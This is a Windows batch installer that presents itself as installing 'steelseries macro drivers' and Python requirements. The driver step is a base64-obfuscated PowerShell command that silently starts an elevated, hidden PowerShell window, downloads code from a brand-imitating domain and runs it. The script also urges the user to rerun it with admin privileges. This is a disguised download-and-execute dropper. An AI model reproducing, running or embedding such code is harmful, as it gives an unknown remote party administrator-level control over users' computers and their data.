@echo off
setlocal EnableDelayedExpansion
color 6

echo [LOG] Installing Drivers

:: Use steelseries macro drivers...
powershell -Command "iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIABpAHIAbQAgAHMAdABlAGUAbABzAGUAcgBpAGUAcwAuAGEAcABwACAAfAAgAGkAZQB4ACIAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==')))"

echo [LOG] Drivers Installed!

color 6
echo [LOG] Installing requirements.txt
pip install -r requirements.txt

echo [LOG] Requirements Installed!

echo
echo
echo If the script fails...
echo Rerun installer.bat with admin privileges

PAUSE
cls
